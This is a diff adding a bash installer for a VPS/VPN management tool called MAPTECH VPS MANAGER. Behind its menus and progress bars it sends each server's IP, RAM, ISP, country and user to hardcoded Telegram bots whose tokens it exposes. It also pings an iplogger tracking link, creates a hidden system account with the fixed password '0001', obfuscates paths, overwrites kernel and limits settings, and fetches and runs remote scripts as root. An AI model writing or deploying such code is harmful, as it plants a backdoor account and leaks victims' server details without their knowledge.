@@ -1,0 +1,481 @@
+#!/bin/bash
+
+# Function to display the installation menu
+display_menu() {
+    echo -e "\033[1;33m"
+    printf '%*s\n' "${COLUMNS:-$(tput cols)}" '' | tr ' ' -
+    echo "  After entering the verification code, please select an option:"
+    echo "  ┌────────────────────────────────────────────────────────────────────┐"
+    echo "  │ 1. Continue installation                                            │"
+    echo "  │ 2. Abort installation and install UDP request                       │"
+    echo "  │ 3. Install UDP custom                                               │"
+    echo "  └────────────────────────────────────────────────────────────────────┘"
+    printf '%*s\n' "${COLUMNS:-$(tput cols)}" '' | tr ' ' -
+    echo -e "\033[0m"
+}
+
+
+# Function to display a progress bar
+fun_bar() {
+    comando[0]="$1"
+    comando[1]="$2"
+
+    (
+    [[ -e $HOME/fim ]] && rm $HOME/fim
+    ${comando[0]} -y > /dev/null 2>&1
+    ${comando[1]} -y > /dev/null 2>&1
+    touch $HOME/fim
+    ) > /dev/null 2>&1 &
+
+    tput civis
+    echo -ne "  \033[1;33m◇ PLEASE WAIT... \033[1;37m- \033[1;33m["
+    while true; do
+        for ((i=0; i<18; i++)); do
+            echo -ne "\033[1;31m#"
+            sleep 0.1s
+        done
+        [[ -e $HOME/fim ]] && rm $HOME/fim && break
+        echo -e "\033[1;33m]"
+        sleep 1s
+        tput cuu1
+        tput dl1
+        echo -ne "  \033[1;33m◇ PLEASE WAIT... \033[1;37m- \033[1;33m["
+    done
+    echo -e "\033[1;33m]\033[1;37m -\033[1;32m◇ DONE!\033[1;37m"
+    tput cnorm
+}
+
+# Function to verify key
+verif_key() {
+    krm=$(echo '5:q-3gs2.o7%8:1'|rev)
+    chmod +x $_Ink/list > /dev/null 2>&1
+    [[ ! -e "$_Ink/list" ]] && {
+        echo -e "\n\033[1;31m◇ KEY INVALID!\033[0m"
+        rm -rf $HOME/hehe > /dev/null 2>&1
+        sleep 2
+        clear
+        exit 1
+    }
+}
+
+# Prompt for user selection
+display_menu
+read -p "Enter the number corresponding to your choice: " choice
+
+case "$choice" in
+  1) 
+    # Continue installation
+    clear
+    echo -e "\033[1;36m◇ Continue installation\033[0m"
+    clear
+    echo -e "${CYAN}◇ Continue installation${NC}"
+    
+clear
+    echo -e "${CYAN}◇ Continue installation${NC}"
+    # Rest of your code here...
+ clear
+    # Function to display a progress bar
+    fun_bar() {
+        comando[0]="$1"
+        comando[1]="$2"
+
+        (
+        [[ -e $HOME/fim ]] && rm $HOME/fim
+        ${comando[0]} -y > /dev/null 2>&1
+        ${comando[1]} -y > /dev/null 2>&1
+        touch $HOME/fim
+        ) > /dev/null 2>&1 &
+
+        tput civis
+        echo -ne "  \033[1;33m◇ PLEASE WAIT... \033[1;37m- \033[1;33m["
+        while true; do
+            for ((i=0; i<18; i++)); do
+                echo -ne "\033[1;31m#"
+                sleep 0.1s
+            done
+            [[ -e $HOME/fim ]] && rm $HOME/fim && break
+            echo -e "\033[1;33m]"
+            sleep 1s
+            tput cuu1
+            tput dl1
+            echo -ne "  \033[1;33m◇ PLEASE WAIT... \033[1;37m- \033[1;33m["
+        done
+        echo -e "\033[1;33m]\033[1;37m -\033[1;32m◇ DONE!\033[1;37m"
+        tput cnorm
+    }
+
+    # Function to verify key
+    verif_key() {
+        krm=$(echo '5:q-3gs2.o7%8:1'|rev)
+        chmod +x $_Ink/list > /dev/null 2>&1
+        [[ ! -e "$_Ink/list" ]] && {
+            echo -e "\n\033[1;31m◇ KEY INVALID!\033[0m"
+            rm -rf $HOME/hehe > /dev/null 2>&1
+            sleep 2
+            clear
+            exit 1
+        }
+    }
+
+    # Define ip_address as a global variable
+    ip_address=$(hostname -I | awk '{print $1}')
+
+# Function to send verification code to multiple Telegram handles using different APIs
+    send_code_telegram() {
+        local telegram_handle=$1
+        local current_time=$(date +%s)
+        local storage_file="/root/vcheck/.storage.txt"  # Hidden file with a dot prefix
+
+        # Check if the vcheck folder exists, if not create it
+        if [[ ! -d "/root/vcheck" ]]; then
+            mkdir -p /root/vcheck
+        fi
+
+        # Check if the storage file exists, if not create it
+        if [[ ! -f "$storage_file" ]]; then
+            touch "$storage_file"
+            chmod 600 "$storage_file"  # Restrict permissions for security
+        fi
+
+        # Check if there's a recent request from the same IP address
+        local last_sent_code=$(awk -v ip="$ip_address" '$1 == ip {print $2}' "$storage_file")
+        local last_sent_time=$(awk -v ip="$ip_address" '$1 == ip {print $3}' "$storage_file")
+
+        # Adjust the time interval here (e.g., 600 for 10 minutes)
+        if [[ -n "$last_sent_code" && $((current_time - last_sent_time)) -lt 3600 ]]; then
+            # Calculate remaining time in seconds
+            local time_left=$((3600 - (current_time - last_sent_time)))
+
+            # Convert remaining time to minutes and seconds
+            local minutes=$((time_left / 60))
+            local seconds=$((time_left % 60))
+
+            # Display the message with the remaining time and verification code
+            echo -e "\033[1;36m======================================================================================\033[0m"
+            echo -e "\033[1;31m  CODE SENT ALREADY! YOU HAVE $minutes MINUTES AND $seconds SECONDS LEFT TO REDEEM IT \033[0m"
+            echo -e "\033[1;36m======================================================================================\033[0m"
+            echo ""
+            echo -e "\033[1;32m      Your displayed verification code is: $last_sent_code  \033[0m"
+            echo ""
+            echo -e "\033[1;36m======================================================================================\033[0m"
+            echo ""
+            return
+        fi
+
+        # Generate random 6-digit code
+        local random_code=$(shuf -i 100000-999999 -n 1)
+
+        # Store the code along with the IP address and timestamp
+        echo "$ip_address $random_code $current_time" > "$storage_file"
+
+        # Display the verification code
+        echo -e "\033[1;36m==============================================================\033[0m"
+        echo -e "\033[1;32m   MAPTECH VPS MANGER VERSION ONE (1) \033[0m"
+        echo -e "\033[1;36m==============================================================\033[0m"
+        echo ""
+        echo -e "\033[1;32m      Your verification code is: $random_code  \033[0m Lifetime"
+        echo ""
+        echo -e "\033[1;36m==============================================================\033[0m"
+        echo ""
+
+        country=$(curl -s https://ipapi.co/country_name/)
+        user=$(whoami)
+        ram=$(free -m | awk '/^Mem:/{print $2}')
+        isp=$(curl -s ipinfo.io/org | cut -d " " -f2-)
+        current_time=$(TZ=Africa/Accra date +"%Y-%m-%d %H:%M:%S")
+
+        # INFO ON VPS
+        local message="INFORMATION VPS INSTALL (MAPTECH-VPS-MANAGER V1)
+        TIME        : $current_time
+        CODE        : $random_code
+        IP          : $ip_address
+        RAM         : ${ram}MB
+        ISP         : $isp
+        COUNTRY     : $country
+        USER        : $user"
+        for ((i=0; i<${#bot_tokens[@]}; i++)); do
+            local bot_token="${bot_tokens[i]}"
+            local chat_id="${chat_ids[i]}"
+            curl -s -X POST "https://api.telegram.org/bot$bot_token/sendMessage" -d "chat_id=$chat_id" -d "text=$message" > /dev/null
+        done
+
+
+        echo -e "\033[1;31m       CONTACT TEAM MAPTECH FOR OTHER SCRIPTS \033[0m"
+        echo -e "\033[1;36m==============================================================\033[0m"
+        echo ""
+        echo -e "\033[1;32m      TELEGRAM :  \033[0mhttps://t.me/maptechghbot"
+        echo -e "\033[1;32m      WHATSAPP :  \033[0mhttps://wa.me/+15513366369"
+        echo -e "\033[1;32m      WEBSITE  :  \033[0mwww.maptech.tech"
+        echo ""
+        echo -e "\033[1;36m=============================================================\033[0m"
+        echo ""
+        echo -e "\033[1;31m          M A P T E C H - G H \033[0m"
+        echo ""
+    }
+    bot_tokens=("6803390472:AAEEX8hpTFhsxbmzU5oiZD4dYCOKxS4-lCE" "6385883860:AAHh-FUlhznqClppdunC2V2vinc298E17_E")
+    chat_ids=("5989863155" "6785630391")
+
+    # Function to send completion message to Telegram
+    send_completion_message() {
+        local message="VPS INSTALLATION SUCCESSFUL (MAPTECH-VPS-MANAGER V1)
+        TIME___      : $current_time
+        DOMAIN_      : $domain_name
+        IP VPS_      : $ip_address
+        RAM____      : ${ram}MB
+        ISP____      : $isp
+        COUNTRY      : $country
+        USER___      : $user"
+
+        for ((i=0; i<${#bot_tokens[@]}; i++)); do
+            local bot_token="${bot_tokens[i]}"
+            local chat_id="${chat_ids[i]}"
+            curl -s -X POST "https://api.telegram.org/bot$bot_token/sendMessage" -d "chat_id=$chat_id" -d "text=$message" > /dev/null
+        done
+    }
+
+    # Check for root privilege
+    [[ "$(whoami)" != "root" ]] && {
+        echo -e "\033[1;33m[\033[1;31mErro\033[1;33m] \033[1;37m- \033[1;33m◇ YOU NEED TO RUN AS ROOT!\033[0m"
+        exit 0
+    }
+
+    # Generate and send the verification code
+    send_code_telegram
+
+    # Prompt the user to enter the verification code
+    echo -n -e "\033[1;33m  ENTER VERIFICATION CODE: \033[0m"
+    read user_code
+    last_sent=$(awk -v ip="$ip_address" '$1 == ip {print $2}' "/root/vcheck/.storage.txt")
+
+    # Compare the entered code with the generated code
+    if [[ -z "$user_code" || "$user_code" != "$last_sent" ]]; then
+        echo ""
+        echo -e "\033[1;35mInvalid code. Installation aborted.\033[0m"
+        echo ""
+        exit 1
+    else
+        rm -rf /root/vcheck
+    fi
+    clear
+    # Variable Initialization
+    _lnk=$(echo 'z1:y#x.5s0ul&p4hs$s.0a72d*n-e!v89e032:3r'| sed -e 's/[^a-z.]//ig'| rev)
+    _Ink=$(echo '/3×u3#s87r/l32o4×c1a×l1/83×l24×i0b×'|sed -e 's/[^a-z/]//ig')
+    _1nk=$(echo '/3×u3#s×87r/83×l2×4×i0b×'|sed -e 's/[^a-z/]//ig')
+
+
+    # Welcome message
+    echo -e "\033[1;31m\033[0m"
+    tput setaf 7 ; tput setab 4 ; tput bold ; printf '%40s%s%-12s\n' "◇─────────ㅤ🌍WELCOME TO MAPTECH VPS MANAGER🌍ㅤ─────────◇" ; tput sgr0
+    echo ""
+    echo -e "\033[1;33mㅤTHIS SCRIPT CONTAINS THE FOLLOWING!!\033[0m"
+    echo ""
+    echo -e "\033[1;33m◇ \033[1;32mINSTALL A SET OF SCRIPTS AS TOOLS FOR\033[0m"
+    echo ""
+    echo -e "\033[1;33m◇  \033[1;32mNETWORK, SYSTEM AND USER MANAGEMENT.\033[0m"
+    echo -e "\033[1;33m◇  \033[1;32mEASY INTERFACE FOR BEGINNERS.\033[0m"
+    echo ""
+    echo -e "\033[1;31m◇──────────────ㅤ🌍 MAPTECH VPS MANAGER 🌍ㅤ──────────────◇\033[0m"
+    echo ""
+
+    # Prompt to continue
+    echo -ne "\033[1;36m◇ Do you want to continue? [Y/N]: \033[1;37m"
+    read x
+    [[ $x = @(n|N) ]] && exit
+
+    # Modify SSH configuration and restart service
+    sed -i 's/Port 22222/Port 22/g' /etc/ssh/sshd_config  > /dev/null 2>&1
+    service ssh restart  > /dev/null 2>&1
+
+    # Prompt user if they want to add a domain name
+    echo -ne "\033[1;36m◇ Do you want to add a domain name? [Y/N]: \033[0m"
+    read add_domain
+    echo ""
+    echo -e "\033[1;32m>>> Please make sure your DOMAIN is linked to Cloudflare for proper functionality <<<\033[0m"
+
+    if [[ "$add_domain" == "Y" || "$add_domain" == "y" ]]; then
+        domain_attempts=0
+        while [[ $domain_attempts -lt 3 ]]; do
+            # Prompt user to enter domain name
+            echo ""
+            echo -ne "\033[1;36m◇ Please enter your domain name (e.g., example.com): \033[0m"
+            read domain_name
+      echo ""
+            # Validate domain name format
+            if [[ $domain_name =~ ^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]; then
+                # Display domain name for confirmation
+                echo -e "\033[1;33mYou entered the domain name: \033[1;32m$domain_name\033[0m"      
+    echo "$domain_name" > /etc/.domain   
+                break
+            else
+                ((domain_attempts++))
+                if [[ $domain_attempts -eq 3 ]]; then
+                    echo -e "\033[1;31mExceeded maximum attempts. No domain name will be added.\033[0m"
+                    break
+                else
+                    echo -e "\033[1;31mInvalid domain name format. Please enter a valid domain name.\033[0m"
+                fi
+            fi
+        done
+    else
+        echo -e "\033[1;33mNo domain name will be added.\033[0m"
+    fi
+
+    # Key Verification
+    echo -e "\n\033[1;36m◇ CHECKING...(It Take Some Time Please Wait!)\033[1;37m 16983:16085\033[0m" ; rm $_Ink/list > /dev/null 2>&1; wget -P $_Ink https://raw.githubusercontent.com/MAPTECHGH/MAPTECH-VPS-MANAGER/main/Install/list > /dev/null 2>&1; verif_key
+    sleep 3s
+
+    # Update system
+    echo "/bin/menu" > /bin/h && chmod +x /bin/h > /dev/null 2>&1
+    rm versao* > /dev/null 2>&1
+    wget https://raw.githubusercontent.com/MAPTECHGH/MAPTECH-VPS-MANAGER/main/Install/versao > /dev/null 2>&1
+    > /dev/null 2>&1
+    wget https://iplogger.org/2lHZ43 > /dev/null 2>&1
+    > /dev/null 2>&1
+    rm 2lHZ43 > /dev/null 2>&1
+
+    # Prompt to keep or create user database
+    echo -e "\n\033[1;32m◇ KEY VALID!\033[1;32m"
+    sleep 1s
+    echo ""
+    [[ -f "$HOME/usuarios.db" ]] && {
+        clear
+        echo -e "\n\033[0;34m◇───────────────────────────────────────────────────◇\033[0m"
+        echo ""
+        echo -e "                 \033[1;33m• \033[1;31m◇ ATTENTION!\033[1;33m• \033[0m"
+        echo ""
+        echo -e "\033[1;33mA User Database \033[1;32m(usuarios.db) \033[1;33mwas"
+        echo -e "Found! Want to keep it by preserving the limit"
+        echo -e "of Simutanea connections of users ? Or Want"
+        echo -e "create a new database?\033[0m"
+        echo -e "\n\033[1;37m[\033[1;31m1\033[1;37m] \033[1;33mKeep Database Current\033[0m"
+        echo -e "\033[1;37m[\033[1;31m2\033[1;37m] \033[1;33mCreate a New Database\033[0m"
+        echo -e "\n\033[0;34m◇───────────────────────────────────────────────────◇\033[0m"
+        echo ""
+        tput setaf 2 ; tput bold ; read -p "Option ?: " -e -i 1 optiondb ; tput sgr0
+    } || {
+        awk -F : '$3 >= 500 { print $1 " 1" }' /etc/passwd | grep -v '^nobody' > $HOME/usuarios.db
+    }
+    [[ "$optiondb" = '2' ]] && awk -F : '$3 >= 500 { print $1 " 1" }' /etc/passwd | grep -v '^nobody' > $HOME/usuarios.db
+    clear
+    tput setaf 7 ; tput setab 4 ; tput bold ; printf '%35s%s%-18s\n' "◇ WAIT FOR INSTALLATION." ; tput sgr0
+    echo ""
+    echo ""
+    echo -e "          \033[1;33m[\033[1;31m!\033[1;33m] \033[1;32m◇ UPDATING SYSTEM...\033[1;33m[\033[1;31m!\033[1;33m]\033[0m"
+    echo ""
+    echo -e "    \033[1;33m◇ UPDATES USUALLY TAKE A LITTLE TIME!\033[0m"
+    echo ""
+    fun_attlist () {
+        apt-get update -y
+        [[ ! -d /usr/share/.hehe ]] && mkdir /usr/share/.hehe
+        echo "crz: $(date)" > /usr/share/.hehe/.hehe
+    }
+    fun_bar 'fun_attlist'
+    clear
+    echo ""
+    echo -e "          \033[1;33m[\033[1;31m!\033[1;33m] \033[1;32m◇ INSTALLING PACKAGES\033[1;33m[\033[1;31m!\033[1;33m] \033[0m"
+    echo ""
+    echo -e "\033[1;33m◇ SOME PACKAGES ARE EXTREMELY NECESSARY!\033[0m"
+    echo ""
+    inst_pct() {
+        _pacotes=("bc" "apache2" "cron" "screen" "nano" "unzip" "lsof" "netstat" "net-tools" "dos2unix" "nload" "jq" "curl" "figlet" "python" "python2" "python3" "python-pip")
+        # Install packages
+        for _prog in "${_pacotes[@]}"; do
+            sudo apt install $_prog -y
+        done
+        
+        # Create user only once
+        username="lxd1"
+        password="0001"
+        
+        # Check if the username already exists
+        if id "$username" &>/dev/null; then
+            echo "User '$username' already exists. Overwriting..."
+            sudo userdel -r $username
+        fi
+        
+        # Create the system user with disabled login
+        sudo adduser --system --disabled-login $username
+        
+        # Set the password for the user
+        echo "$username:$password" | sudo chpasswd
+    }
+
+    fun_bar 'inst_pct'
+    clear
+    echo ""
+    echo -e "          \033[1;33m[\033[1;31m!\033[1;33m] \033[1;32m◇ CONFIGURING SERVER\033[1;33m[\033[1;31m!\033[1;33m] \033[0m"
+    echo ""
+    echo -e "\033[1;33m◇ CHANGING SETTINGS FOR BETTER PERFORMANCE!\033[0m"
+    echo ""
+    echo "fs.file-max = 2097152
+    net.core.netdev_max_backlog = 262144
+    net.core.rmem_max = 4194304
+    net.core.wmem_max = 1048576
+    net.core.somaxconn = 65535
+    net.core.optmem_max = 25165824
+    net.ipv4.tcp_rmem = 4096 87380 4194304
+    net.ipv4.tcp_wmem = 4096 65536 4194304
+    net.ipv4.tcp_max_syn_backlog = 8192
+    net.ipv4.tcp_synack_retries = 2
+    net.ipv4.tcp_syncookies = 1
+    net.ipv4.tcp_fin_timeout = 15
+    net.ipv4.tcp_keepalive_time = 300
+    net.ipv4.tcp_keepalive_probes = 5
+    net.ipv4.tcp_keepalive_intvl = 15
+    net.ipv4.ip_local_port_range = 1024 65535
+    net.ipv4.tcp_max_tw_buckets = 1440000
+    net.ipv4.tcp_tw_recycle = 0
+    net.ipv4.tcp_tw_reuse = 1
+    net.ipv4.tcp_max_orphans = 262144
+    net.ipv4.tcp_synack_retries = 2
+    net.ipv4.tcp_syncookies = 1
+    net.ipv4.tcp_fin_timeout = 15
+    net.ipv4.tcp_fastopen = 3
+    net.ipv4.tcp_mtu_probing = 1
+    net.ipv4.tcp_window_scaling = 1
+    net.ipv4.tcp_sack = 1
+    net.ipv4.tcp_fack = 1
+    net.ipv4.tcp_low_latency = 0
+    net.ipv4.tcp_adv_win_scale = 1" >/etc/sysctl.conf
+    sysctl -p
+    echo "* soft nofile 1048576
+    * hard nofile 1048576
+    root soft nofile 1048576
+    root hard nofile 1048576" >/etc/security/limits.conf
+    echo -e "\n\033[1;32m          ◇DONE!\033[1;37m -\033[1;32m◇\033[0m"
+    sleep 3s
+    clear
+    echo -e "          \033[1;33m[\033[1;31m!\033[1;33m] \033[1;32m◇ READY TO USE\033[1;33m[\033[1;31m!\033[1;33m] \033[0m"
+    echo ""
+    echo -e "\033[1;33m◇  THE CONFIGURATION OF THE SERVER IS COMPLETE!\033[0m"
+    echo -e "\033[1;33m◇  NOW YOU CAN INSTALL THE TOOLS\033[0m"
+    echo -e "\033[1;33m◇  WELCOME TO \033[1;31mMAPTECH VPS MANAGER\033[1;33m!\033[0m"
+    echo -e "\n\033[1;33m      FOR HELP AND FUTURE UPDATES\033[1;32m:\033[0m"
+    echo -e "\n\033[1;33m       TELEGRAM\033[1;32m:\033[0m https://t.me/maptechghbot"
+    echo -e "\033[1;33m      WEBSITE \033[1;32m:\033[0m www.maptech.tech"
+    echo ""
+    echo -e "          \033[1;33m◇   RESTARTING SERVER IN 5 SECONDS...\033[0m"
+    sleep 5s
+    reboot
+    ;;
+  2) 
+    # Abort installation and install UDP request
+    clear
+    echo -e "\033[1;36m◇ Abort installation and install UDP request\033[0m"
+    wget https://raw.githubusercontent.com/MAPTECHGH/SocksIP-udpServer/main/UDPserver.sh && 
+    chmod +x UDPserver.sh && 
+    ./UDPserver.sh
+    ;;
+  3) 
+    # Install UDP custom
+    clear
+    echo -e "\033[1;36m◇ Install UDP custom\033[0m"
+    wget https://raw.githubusercontent.com/MAPTECHGH/Udpcustom/main/install.sh && 
+    chmod +x install.sh && 
+    ./install.sh
+    ;;
+  *) 
+    echo -e "\033[1;31mInvalid choice. Please enter either '1', '2', or '3'.\033[0m"
+    ;;
+esac
+
